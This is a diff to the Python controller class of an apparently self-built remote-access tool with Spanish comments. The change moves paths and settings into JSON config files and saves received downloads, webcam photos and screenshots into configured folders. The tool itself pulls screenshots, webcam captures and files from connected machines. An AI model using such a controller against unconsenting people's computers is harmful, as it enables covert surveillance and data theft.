@@ -22,14 +22,39 @@ init(autoreset=True)
 class TCP:
     # Se inicializa el host, el port y el chunk del programa
     def __init__(self, host, port):
+        self.__myOs = platform.system().lower()
+        if self.__myOs == 'linux':
+            self.__src = f'/home/{getpass.getuser()}/.tcpIpy/server'
+        if self.__myOs == 'windows':
+            self.__src = f'C:\\Users\\{getpass.getuser()}\\.tcpIpy\\server'
+
+        # Se cargan las variables de entorno
+        if self.__myOs == 'linux':
+            archivo = open(f'{self.__src}/var.json', 'r')
+        if self.__myOs == 'windows':
+            archivo = open(f'{self.__src}\\var.json', 'r')
+        lista = json.load(archivo)
+        archivo.close()
+        self.__var = lista[0]
+        self.__dirs = lista[1]
+        self.loadDirs()
+
+        # Se cargan los alias del archivo JSON
+        if self.__myOs == 'linux':
+            archivo = open(f'{self.__src}/alias.json', 'r')
+        if self.__myOs == 'windows':
+            archivo = open(f'{self.__src}\\alias.json', 'r')
+        lista = json.load(archivo)
+        archivo.close()
+        self.__alias = lista[0]
+
         # host --> 0.0.0.0
         self.__host = host
         # port --> 1024-65535
         self.__port = port
-        self.__newPort = 8888
+        self.__newPort = self.__var['newPort']
         # chunk -->  4MB para enviar informacion
-        self.__chunk = 4194304
-        self.__myOs = platform.system().lower()
+        self.__chunk = self.__var['chunk']
 
         # Se crea un socket
         self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -56,15 +81,6 @@ class TCP:
         self.__userName = info[0]
         self.__hostName = info[1]
         self.__currentDir = info[2]
-
-        # Se cargan los alias del archivo JSON
-        if self.__myOs == 'windows':
-            archivo = open(f'C:\\Users\\{getpass.getuser()}\\.tcpIpy\\server\\alias.json', 'r')
-        if self.__myOs == 'linux':
-            archivo = open(f'/home/{getpass.getuser()}/.tcpIpy/server/alias.json', 'r')
-        lista = json.load(archivo)
-        archivo.close()
-        self.__alias = lista[0]
 
     # Imprime la terminal
     def terminal(self):
@@ -118,6 +134,15 @@ class TCP:
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.settimeout(3)
         return sock
+
+    def loadDirs(self):
+        for k, v in self.__dirs.items():
+            if not os.path.isdir(v) and v != '':
+                try:
+                    os.mkdir(v)
+                    print(Fore.GREEN + f"[+] Directorio \'{v}\' creado")
+                except:
+                    print(Fore.RED + f"[-] Error al crear el directorio \'{v}\'")
 
     # Funcion para generar una clave de encriptacion
     # clave --> nombre del archivo en que se almacena la clave
@@ -524,6 +549,8 @@ class TCP:
             else:
                 self.__conexion.send(b'ok')
                 destino = self.__conexion.recv(1024).decode()
+                if self.__dirs['downloads'] != '' and os.path.isdir(self.__dirs['downloads']):
+                    destino = self.__dirs['downloads'] + '/' + destino
 
             self.__conexion.send(b'ok')
             self.recibirArchivo(destino)
@@ -592,7 +619,10 @@ class TCP:
             if key == 27:
                 break
             if key == ord('s'):
-                cv2.imwrite(f"{nombre}", original)
+                if self.__dirs['imgs'] != '' and os.path.isdir(self.__dirs['imgs']):
+                    cv2.imwrite(f"{self.__dirs['imgs']}/{nombre}", original)
+                else:
+                    cv2.imwrite(f"{nombre}", original)
                 print(Fore.GREEN + f"[+] Foto \"{nombre}\" guardada")
                 break
         cv2.destroyAllWindows()
@@ -627,9 +657,10 @@ class TCP:
             if key == 27:
                 break
             if key == ord('s'):
-                if not os.path.isdir(f"{self.initDir}/pics"):
-                    os.mkdir(f"{self.initDir}/pics")
-                fotoRuta = f"{self.initDir}/pics/pic{self.pics}.jpg"
+                if self.__dirs['pics'] != '' and os.path.isdir(self.__dirs['pics']):
+                    fotoRuta = f"{self.__dirs['pics']}/pic{self.pics}.jpg"
+                else:
+                    fotoRuta = f"pic{self.pics}.jpg"
                 cv2.imwrite(fotoRuta, original)
                 print(Fore.GREEN + f"[+] Foto \"{fotoRuta}\" guardada")
                 self.pics += 1
@@ -677,6 +708,8 @@ class TCP:
         else:
             self.__conexion.send(b'ok')
             destino = self.__conexion.recv(1024).decode()
+            if self.__dirs['downloads'] != '' and os.path.isdir(self.__dirs['downloads']):
+                destino = self.__dirs['downloads'] + '/' + destino
 
         self.__conexion.send(b'ok')
         if flags:
@@ -886,7 +919,10 @@ class TCP:
 
         i = 0
         while i < n:
-            ubicacion = f"{directorio}/ss{i}.png"
+            if self.__dirs['screenshots'] != '' and os.path.isdir(self.__dirs['screenshots']):
+                ubicacion = self.__dirs['screenshots'] + '/' + f'ss{i}.png'
+            else:
+                ubicacion = f"{directorio}/ss{i}.png"
             self.__conexion.recv(8)
             self.recibirArchivo(ubicacion)
             i += 1
@@ -915,6 +951,12 @@ class TCP:
 
                 elif x.lower() == "mialias":
                     for k, v in self.__alias.items():
+                        print(f"{k}=\'{v}\'")
+
+                elif x.lower() == "mienv":
+                    for k, v in self.__var.items():
+                        print(f"{k}=\'{v}\'")
+                    for k, v in self.__dirs.items():
                         print(f"{k}=\'{v}\'")
 
                 # Si el primer caracter del comando es '!',
